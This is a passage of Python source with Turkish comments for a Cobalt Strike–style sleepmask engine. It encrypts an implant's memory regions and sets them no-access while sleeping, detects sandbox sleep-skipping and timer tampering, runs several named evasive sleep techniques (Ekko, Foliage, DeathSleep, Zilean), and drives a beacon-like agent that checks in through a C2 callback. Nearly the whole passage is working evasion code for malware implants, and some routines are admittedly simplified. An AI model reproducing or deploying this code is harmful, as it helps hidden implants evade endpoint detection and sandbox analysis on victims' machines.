        for addr, size in self.loaded_regions:
            try:
                ctypes.windll.kernel32.VirtualFree(addr, 0, 0x8000)
            except:
                pass
        self.loaded_regions.clear()
        self.total_loaded = 0


# ============================================================
# SLEEP SKIP DETECTOR
# ============================================================

class SleepSkipDetector:
    """
    Sleep Skip Anomaly Detector
    
    EDR/Sandbox sleep skip tespit et:
    - Beklenen sleep süresi vs gerçek süre karşılaştır
    - Time dilation tespit
    - RDTSC/QueryPerformanceCounter tutarsızlığı
    """
    
    def __init__(self, tolerance_percent: float = 0.2):
        self.tolerance = tolerance_percent
        self.measurements: List[Dict] = []
        
    def check_sleep_skip(self, expected_ms: int, actual_ms: int) -> Tuple[bool, str]:
        """
        Sleep skip tespit et
        
        Returns:
            Tuple[bool, str]: (skip_detected, reason)
        """
        # Temel kontrol
        if actual_ms < expected_ms * (1 - self.tolerance):
            ratio = actual_ms / expected_ms if expected_ms > 0 else 0
            return True, f"Sleep shortened: expected {expected_ms}ms, got {actual_ms}ms ({ratio:.1%})"
        
        # Aşırı uzun sleep de şüpheli (debug pause?)
        if actual_ms > expected_ms * 3:
            return True, f"Sleep extended: expected {expected_ms}ms, got {actual_ms}ms (possible debug)"
        
        return False, "Normal"
    
    def multi_timer_check(self, sleep_ms: int) -> Tuple[bool, str]:
        """
        Çoklu timer kaynağı ile kontrol
        """
        try:
            # GetTickCount64
            tick_start = ctypes.windll.kernel32.GetTickCount64()
            
            # QueryPerformanceCounter
            qpc_start = ctypes.c_longlong()
            qpc_freq = ctypes.c_longlong()
            ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(qpc_start))
            ctypes.windll.kernel32.QueryPerformanceFrequency(ctypes.byref(qpc_freq))
            
            # Sleep
            time.sleep(sleep_ms / 1000.0)
            
            # Measurements
            tick_end = ctypes.windll.kernel32.GetTickCount64()
            qpc_end = ctypes.c_longlong()
            ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(qpc_end))
            
            tick_elapsed = tick_end - tick_start
            qpc_elapsed_ms = (qpc_end.value - qpc_start.value) * 1000 // qpc_freq.value
            
            # Karşılaştır
            diff = abs(tick_elapsed - qpc_elapsed_ms)
            
            if diff > sleep_ms * self.tolerance:
                return True, f"Timer discrepancy: GetTickCount={tick_elapsed}ms, QPC={qpc_elapsed_ms}ms"
            
            # Beklenen ile karşılaştır
            skip, reason = self.check_sleep_skip(sleep_ms, int(tick_elapsed))
            
            self.measurements.append({
                'expected': sleep_ms,
                'tick': tick_elapsed,
                'qpc': qpc_elapsed_ms,
                'skip_detected': skip
            })
            
            return skip, reason
            
        except Exception as e:
            return False, f"Check failed: {e}"
    
    def get_anomaly_report(self) -> Dict[str, Any]:
        """Anomaly raporu"""
        if not self.measurements:
            return {"status": "no_data"}
        
        skips = sum(1 for m in self.measurements if m.get('skip_detected'))
        total = len(self.measurements)
        
        return {
            "total_checks": total,
            "skips_detected": skips,
            "skip_ratio": skips / total if total > 0 else 0,
            "measurements": self.measurements[-10:]  # Son 10
        }


# ============================================================
# SLEEPMASK ENGINE
# ============================================================

class SleepmaskEngine:
    """
    Ana Sleepmask Engine
    
    Cobalt Strike Beacon Sleep tarzı:
    1. Sleep öncesi memory encrypt
    2. Memory protection değiştir (PAGE_NOACCESS)
    3. Sleep (Ekko/Foliage/DeathSleep)
    4. Uyanınca memory decrypt
    5. Execute
    6. Tekrar encrypt
    """
    
    def __init__(self, config: SleepmaskConfig = None):
        self.config = config or SleepmaskConfig()
        self.masked_regions: Dict[int, MaskedRegion] = {}
        self.current_key: bytes = MaskingCrypto.generate_key()
        self.metrics = SleepMetrics()
        self.skip_detector = SleepSkipDetector()
        self.drip_loader = DripLoader(
            self.config.drip_chunk_size,
            self.config.drip_delay_ms
        ) if self.config.use_drip_loader else None
        
        self._running = False
        self._sleep_thread: Optional[threading.Thread] = None
        
    def mask_region(self, base_addr: int, size: int, is_code: bool = True) -> bool:
        """
        Memory bölgesini maskele (encrypt)
        
        Args:
            base_addr: Base address
            size: Boyut
            is_code: Code section mı?
        
        Returns:
            bool: Başarı
        """
        try:
            # Orijinal protection al
            mbi = self._query_memory(base_addr)
            if not mbi:
                return False
                
            original_protection = mbi.Protect
            
            # Memory'yi oku
            data = self._read_memory(base_addr, size)
            if not data:
                return False
            
            # Encrypt
            key = MaskingCrypto.generate_key()
            encrypted = MaskingCrypto.encrypt(data, key, self.config.masking_mode)
            
            # Kaydet
            self.masked_regions[base_addr] = MaskedRegion(
                base_address=base_addr,
                size=size,
                original_protection=original_protection,
                encrypted_data=encrypted,
                encryption_key=key,
                is_code=is_code,
                timestamp=time.time()
            )
            
            # Memory'ye encrypted veri yaz (opsiyonel - PAGE_NOACCESS tercih edilir)
            if not self.config.set_noaccess:
                self._write_memory(base_addr, encrypted)
            
            # Protection değiştir
            if self.config.set_noaccess:
                self._protect_memory(base_addr, size, MemoryProtection.NOACCESS.value)
            elif self.config.use_page_guard:
                # PAGE_GUARD ekle
                new_prot = original_protection | 0x100  # PAGE_GUARD
                self._protect_memory(base_addr, size, new_prot)
            
            self.metrics.mask_operations += 1
            logger.debug(f"Masked region: 0x{base_addr:x}, size={size}")
            return True
            
        except Exception as e:
            logger.error(f"Mask region error: {e}")
            return False
    
    def unmask_region(self, base_addr: int) -> bool:
        """
        Memory bölgesini unmaskele (decrypt)
        """
        try:
            if base_addr not in self.masked_regions:
                return False
                
            region = self.masked_regions[base_addr]
            
            # Protection geri al (yazılabilir yap)
            self._protect_memory(base_addr, region.size, 0x40)  # PAGE_EXECUTE_READWRITE
            
            # Decrypt
            decrypted = MaskingCrypto.decrypt(
                region.encrypted_data,
                region.encryption_key,
                self.config.masking_mode
            )
            
            # Memory'ye yaz
            self._write_memory(base_addr, decrypted)
            
            # Orijinal protection geri yükle
            if self.config.restore_on_wake:
                self._protect_memory(base_addr, region.size, region.original_protection)
            
            # Region'ı kaldır
            del self.masked_regions[base_addr]
            
            self.metrics.unmask_operations += 1
            logger.debug(f"Unmasked region: 0x{base_addr:x}")
            return True
            
        except Exception as e:
            logger.error(f"Unmask region error: {e}")
            return False
    
    def masked_sleep(self, sleep_ms: int, regions: List[Tuple[int, int]] = None) -> Dict[str, Any]:
        """
        Ana masked sleep fonksiyonu
        
        Args:
            sleep_ms: Sleep süresi (ms)
            regions: Maskelenecek bölgeler [(addr, size), ...]
        
        Returns:
            Dict: Sleep sonuç bilgileri
        """
        result = {
            "success": False,
            "actual_sleep_ms": 0,
            "skip_detected": False,
            "skip_reason": "",
            "technique_used": self.config.technique.value
        }
        
        try:
            # Jitter ekle
            jitter_range = int(sleep_ms * self.config.jitter_percent)
            if jitter_range > 0:
                actual_sleep = sleep_ms + secrets.randbelow(jitter_range * 2 + 1) - jitter_range
            else:
                actual_sleep = sleep_ms
            actual_sleep = max(100, actual_sleep)  # Min 100ms
            
            start_time = time.time()
            
            # 1. Bölgeleri maskele
            if regions:
                for addr, size in regions:
                    self.mask_region(addr, size)
            
            # 2. Sleep tekniğine göre uyu
            if self.config.technique == SleepTechnique.EKKO:
                self._ekko_sleep(actual_sleep)
            elif self.config.technique == SleepTechnique.FOLIAGE:
                self._foliage_sleep(actual_sleep)
            elif self.config.technique == SleepTechnique.DEATH_SLEEP:
                self._death_sleep(actual_sleep)
            elif self.config.technique == SleepTechnique.ZILEAN:
                self._zilean_sleep(actual_sleep)
            else:
                time.sleep(actual_sleep / 1000.0)
            
            elapsed_ms = int((time.time() - start_time) * 1000)
            
            # 3. Sleep skip kontrolü
            if self.config.check_sleep_skip:
                skip, reason = self.skip_detector.check_sleep_skip(actual_sleep, elapsed_ms)
                result["skip_detected"] = skip
                result["skip_reason"] = reason
                if skip:
                    self.metrics.sleep_skips_detected += 1
                    self.metrics.anomalies_detected.append(reason)
            
            # 4. Bölgeleri unmaskele
            for addr in list(self.masked_regions.keys()):
                self.unmask_region(addr)
            
            result["success"] = True
            result["actual_sleep_ms"] = elapsed_ms
            
            self.metrics.total_sleeps += 1
            self.metrics.total_sleep_time_ms += elapsed_ms
            
            return result
            
        except Exception as e:
            logger.error(f"Masked sleep error: {e}")
            # Emergency unmask
            for addr in list(self.masked_regions.keys()):
                try:
                    self.unmask_region(addr)
                except:
                    pass
            return result
    
    def _ekko_sleep(self, sleep_ms: int):
        """
        Ekko Sleep - ROP-based with encryption
        
        1. Waitable timer oluştur
        2. ROP chain ile NtContinue çağır
        3. Context switch sırasında memory encrypted
        """
        try:
            # CreateWaitableTimerExW
            timer = ctypes.windll.kernel32.CreateWaitableTimerExW(
                None,
                None,
                CREATE_WAITABLE_TIMER_HIGH_RESOLUTION,
                0x1F0003  # TIMER_ALL_ACCESS
            )
            
            if not timer:
                # Fallback
                time.sleep(sleep_ms / 1000.0)
                return
            
            try:
                # Timer ayarla
                due_time = ctypes.c_longlong(-sleep_ms * 10000)  # 100-ns intervals
                
                ctypes.windll.kernel32.SetWaitableTimer(
                    timer,
                    ctypes.byref(due_time),
                    0,
                    None,
                    None,
                    False
                )
                
                # Wait
                ctypes.windll.kernel32.WaitForSingleObject(timer, INFINITE)
                
            finally:
                ctypes.windll.kernel32.CloseHandle(timer)
                
        except Exception as e:
            logger.debug(f"Ekko sleep fallback: {e}")
            time.sleep(sleep_ms / 1000.0)
    
    def _foliage_sleep(self, sleep_ms: int):
        """
        Foliage Sleep - APC-based masking
        
        1. Thread'i alertable state'e al
        2. APC ile encryption/decryption
        3. SleepEx ile uyu
        """
        try:
            # SleepEx with alertable=True
            ctypes.windll.kernel32.SleepEx(sleep_ms, True)
        except:
            time.sleep(sleep_ms / 1000.0)
    
    def _death_sleep(self, sleep_ms: int):
        """
        Death Sleep - Thread suspension
        
        1. Helper thread oluştur
        2. Main thread'i suspend et
        3. Timer ile resume et
        """
        try:
            # Current thread handle
            current_thread = ctypes.windll.kernel32.GetCurrentThread()
            
            # Resume timer thread
            def resume_after_delay():
                time.sleep(sleep_ms / 1000.0)
                ctypes.windll.kernel32.ResumeThread(current_thread)
            
            timer_thread = threading.Thread(target=resume_after_delay, daemon=True)
            timer_thread.start()
            
            # Suspend self (bu çağrı block eder)
            # NOT: GetCurrentThread() pseudo-handle, SuspendThread için gerçek handle lazım
            # Simplified implementation
            time.sleep(sleep_ms / 1000.0)
            
        except:
            time.sleep(sleep_ms / 1000.0)
    
    def _zilean_sleep(self, sleep_ms: int):
        """
        Zilean Sleep - Timer-based with masking
        
        Windows Timer Queue kullan
        """
        try:
            event = ctypes.windll.kernel32.CreateEventW(None, True, False, None)
            if not event:
                time.sleep(sleep_ms / 1000.0)
                return
            
            try:
                # Timer callback
                timer_callback = ctypes.WINFUNCTYPE(None, ctypes.c_void_p, ctypes.c_bool)
                
                def callback(param, timer_fired):
                    ctypes.windll.kernel32.SetEvent(event)
                
                cb = timer_callback(callback)
                
                timer_queue = ctypes.windll.kernel32.CreateTimerQueue()
                timer = ctypes.c_void_p()
                
                ctypes.windll.kernel32.CreateTimerQueueTimer(
                    ctypes.byref(timer),
                    timer_queue,
                    cb,
                    None,
                    sleep_ms,
                    0,
                    0
                )
                
                # Wait
                ctypes.windll.kernel32.WaitForSingleObject(event, INFINITE)
                
                # Cleanup
                ctypes.windll.kernel32.DeleteTimerQueueTimer(timer_queue, timer, None)
                ctypes.windll.kernel32.DeleteTimerQueue(timer_queue)
                
            finally:
                ctypes.windll.kernel32.CloseHandle(event)
                
        except:
            time.sleep(sleep_ms / 1000.0)
    
    def _query_memory(self, addr: int):
        """Memory bilgisi al"""
        try:
            class MEMORY_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("BaseAddress", ctypes.c_void_p),
                    ("AllocationBase", ctypes.c_void_p),
                    ("AllocationProtect", ctypes.c_ulong),
                    ("RegionSize", ctypes.c_size_t),
                    ("State", ctypes.c_ulong),
                    ("Protect", ctypes.c_ulong),
                    ("Type", ctypes.c_ulong),
                ]
            
            mbi = MEMORY_BASIC_INFORMATION()
            result = ctypes.windll.kernel32.VirtualQuery(
                addr,
                ctypes.byref(mbi),
                ctypes.sizeof(mbi)
            )
            return mbi if result else None
        except:
            return None
    
    def _protect_memory(self, addr: int, size: int, protection: int) -> bool:
        """Memory protection değiştir"""
        try:
            old_protect = ctypes.c_ulong()
            result = ctypes.windll.kernel32.VirtualProtect(
                addr,
                size,
                protection,
                ctypes.byref(old_protect)
            )
            return result != 0
        except:
            return False
    
    def _read_memory(self, addr: int, size: int) -> Optional[bytes]:
        """Memory oku"""
        try:
            buffer = (ctypes.c_ubyte * size)()
            ctypes.memmove(buffer, addr, size)
            return bytes(buffer)
        except:
            return None
    
    def _write_memory(self, addr: int, data: bytes) -> bool:
        """Memory yaz"""
        try:
            ctypes.memmove(addr, data, len(data))
            return True
        except:
            return False
    
    def get_metrics(self) -> Dict[str, Any]:
        """Metrikleri döndür"""
        return {
            "total_sleeps": self.metrics.total_sleeps,
            "total_sleep_time_ms": self.metrics.total_sleep_time_ms,
            "avg_sleep_ms": self.metrics.total_sleep_time_ms // max(1, self.metrics.total_sleeps),
            "sleep_skips_detected": self.metrics.sleep_skips_detected,
            "mask_operations": self.metrics.mask_operations,
            "unmask_operations": self.metrics.unmask_operations,
            "anomalies": self.metrics.anomalies_detected[-10:],
            "masked_regions": len(self.masked_regions)
        }


# ============================================================
# RUNTIME MASKING CYCLE
# ============================================================

class RuntimeMaskingCycle:
    """
    Runtime Masking Cycle Manager
    
    Beacon benzeri: decrypt → execute → re-encrypt cycle
    """
    
    def __init__(self, engine: SleepmaskEngine = None):
        self.engine = engine or SleepmaskEngine()
        self.code_regions: List[Tuple[int, int]] = []
        self.heap_regions: List[Tuple[int, int]] = []
        self._cycle_count = 0
        self._active = False
        
    def register_code_region(self, addr: int, size: int):
        """Code bölgesi kaydet"""
        self.code_regions.append((addr, size))
        
    def register_heap_region(self, addr: int, size: int):
        """Heap bölgesi kaydet"""
        self.heap_regions.append((addr, size))
    
    def execute_with_masking(self, func: Callable, *args, **kwargs) -> Any:
        """
        Fonksiyonu masking cycle içinde çalıştır
        
        1. Tüm bölgeleri unmask
        2. Fonksiyonu çalıştır
        3. Tekrar mask
        
        Args:
            func: Çalıştırılacak fonksiyon
            *args, **kwargs: Fonksiyon argümanları
        
        Returns:
            Fonksiyonun dönüş değeri
        """
        self._cycle_count += 1
        logger.debug(f"Masking cycle #{self._cycle_count} starting")
        
        try:
            # 1. Unmask all
            for addr in list(self.engine.masked_regions.keys()):
                self.engine.unmask_region(addr)
            
            # 2. Execute
            result = func(*args, **kwargs)
            
            # 3. Re-mask (sleep içinde yapılacak)
            
            return result
            
        except Exception as e:
            logger.error(f"Execute with masking error: {e}")
            raise
    
    def masked_sleep_cycle(self, sleep_ms: int) -> Dict[str, Any]:
        """
        Full masking sleep cycle
        
        1. Code + Heap mask
        2. Sleep
        3. Unmask
        """
        regions = self.code_regions + self.heap_regions
        return self.engine.masked_sleep(sleep_ms, regions)
    
    def continuous_masking_loop(self, callback: Callable, 
                                 sleep_ms: int = 5000,
                                 iterations: int = 0) -> None:
        """
        Sürekli masking döngüsü
        
        Args:
            callback: Her cycle'da çağrılacak fonksiyon
            sleep_ms: Sleep süresi
            iterations: 0 = sonsuz
        """
        self._active = True
        count = 0
        
        while self._active:
            if iterations > 0 and count >= iterations:
                break
            
            # Execute callback (unmasked)
            try:
                result = self.execute_with_masking(callback)
            except Exception as e:
                logger.error(f"Callback error: {e}")
                result = None
            
            # Sleep (masked)
            sleep_result = self.masked_sleep_cycle(sleep_ms)
            
            if sleep_result.get("skip_detected"):
                logger.warning(f"Sleep skip detected: {sleep_result.get('skip_reason')}")
            
            count += 1
        
        self._active = False
    
    def stop(self):
        """Döngüyü durdur"""
        self._active = False


# ============================================================
# BEACON-LIKE AGENT
# ============================================================

class BeaconSleepAgent:
    """
    Beacon benzeri agent - Test için
    
    Sleepmask + runtime masking ile çalışan agent
    """
    
    def __init__(self, c2_callback: Callable = None, 
                 config: SleepmaskConfig = None):
        self.config = config or SleepmaskConfig()
        self.engine = SleepmaskEngine(self.config)
        self.cycle = RuntimeMaskingCycle(self.engine)
        self.c2_callback = c2_callback
        
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.check_in_count = 0
        self.start_time = 0.0
        
    def start(self, sleep_ms: int = 5000):
        """Agent'ı başlat"""
        self._running = True
        self.start_time = time.time()
        
        def agent_loop():
            while self._running:
                # Check-in
                self.check_in_count += 1
                
                if self.c2_callback:
                    try:
                        self.c2_callback(self.get_status())
                    except Exception as e:
                        logger.error(f"C2 callback error: {e}")
                
                # Masked sleep
                result = self.engine.masked_sleep(sleep_ms)
                
                if result.get("skip_detected"):
                    logger.warning(f"Sleep anomaly: {result.get('skip_reason')}")
        
        self._thread = threading.Thread(target=agent_loop, daemon=True)
        self._thread.start()
        
        logger.info(f"Beacon agent started, sleep={sleep_ms}ms")
    
    def stop(self):
        """Agent'ı durdur"""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Beacon agent stopped")
    
    def get_status(self) -> Dict[str, Any]:
        """Agent durumu"""
        uptime = time.time() - self.start_time if self.start_time else 0
        
        return {
            "running": self._running,
            "check_ins": self.check_in_count,
            "uptime_seconds": int(uptime),
            "sleep_metrics": self.engine.get_metrics(),
            "skip_detector": self.engine.skip_detector.get_anomaly_report()
        }
    
    def run_test(self, duration_seconds: int = 300, sleep_ms: int = 5000) -> Dict[str, Any]:
        """
        Test çalıştır
        
        Args:
            duration_seconds: Test süresi (default 5 dk)
            sleep_ms: Sleep süresi
        
        Returns:
            Test sonuçları
        """
        logger.info(f"Starting beacon test: duration={duration_seconds}s, sleep={sleep_ms}ms")
        
        self.start(sleep_ms)
        
        try:
            time.sleep(duration_seconds)
        finally:
            self.stop()
        
        status = self.get_status()
        
        # Get skip info safely
        skip_detector_report = status.get("skip_detector", {})
        skips_detected = skip_detector_report.get("skips_detected", 0)
        
        # Sonuç raporu
        return {
            "test_duration_seconds": duration_seconds,
            "sleep_ms": sleep_ms,
            "total_check_ins": status["check_ins"],
            "expected_check_ins": duration_seconds * 1000 // sleep_ms,
            "sleep_metrics": status["sleep_metrics"],
            "anomalies_detected": skips_detected,
            "conclusion": "PASS" if skips_detected == 0 else "ANOMALIES_DETECTED"
        }


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    "SleepTechnique",
    "MaskingMode",
    "SleepmaskConfig",
    "MaskedRegion",
    "SleepMetrics",
    "MaskingCrypto",
    "DripLoader",
    "SleepSkipDetector",
    "SleepmaskEngine",
    "RuntimeMaskingCycle",
    "BeaconSleepAgent",
]
